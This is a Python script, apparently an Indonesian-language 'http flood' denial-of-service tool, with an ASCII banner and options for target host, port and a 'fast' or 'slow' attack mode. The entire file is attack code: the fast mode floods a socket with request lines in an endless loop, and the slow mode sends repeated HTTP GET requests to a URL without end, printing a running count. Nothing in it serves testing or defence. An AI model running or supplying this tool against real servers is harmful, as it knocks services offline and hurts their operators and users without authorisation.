import socket
import os
import time
import requests
import optparse
import sys

count = 0

class colors:
    PURPLE = '\033[95m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    BLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OLDGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    YELLOW = '\033[33m'

def help():
	print("""{}
 _      _    _             __  _                    _ 
| |    | |  | |           / _|| |                  | |
| |__  | |_ | |_  _ __   | |_ | |  ___    ___    __| |
| '_ \ | __|| __|| '_ \  |  _|| | / _ \  / _ \  / _` |
| | | || |_ | |_ | |_) | | |  | || (_) || (_) || (_| |
|_| |_| \__| \__|| .__/  |_|  |_| \___/  \___/  \__,_|
                 | |                                  
                 |_|                                      
--h = Untuk memasukkan host(Untuk slow http flood masukkan url)
--p = untuk memasukkan port(80 hanya untuk fast)
--t = Tipe serangan cepat atau lambat(fast , slow)
{}""".format(colors.RED,colors.ENDC))

if len(sys.argv) == 1:
	help()

jembud = optparse.OptionParser()
jembud.add_option("--h", dest="host")
jembud.add_option("--p", dest="port")
jembud.add_option("--t", dest="tipe")
opts , args = jembud.parse_args()
host = opts.host
port = opts.port
tipe = opts.tipe

class dos():
	def fast():
		sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
		ip = socket.gethostbyname(host)
		sock.connect((str(ip) , int(port)))
		print("{}Sudah terhubung ke server {}".format(colors.BLUE , colors.ENDC))
		os.system("clear")
		print("{}IP: {}   port: 80{}".format(colors.RED,ip,colors.ENDC))
		time.sleep(1)
		print("{}1".format(colors.BLUE))
		time.sleep(1)
		print("2")
		time.sleep(1)
		print("3")
		time.sleep(1)
		print("Memulai serangan...{}".format(colors.ENDC))
		time.sleep(2)
		while(True):
			global count
			count += 1
			print("{}Melakukan request sebanyak {} kali{}".format(colors.RED,count,colors.ENDC))
			sock.send("GET / \nHTTP /1.1\n User-Agent: {}\n\r".format("User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0").encode())

	def slow():
		global count
		while(True):
			req = requests.get(host)
			if req.status_code == 200:
				count += 1
				print("{}Melakukan request sebanyak {}{}{} {}kali{}                   {}response:{}{}200 OK{}".format(colors.RED,colors.GREEN,count,colors.ENDC,colors.RED,colors.ENDC,colors.RED,colors.ENDC,colors.GREEN,colors.ENDC,colors.ENDC))

		

if tipe == "fast":
	dos.fast()
if tipe == "slow":
	dos.slow()

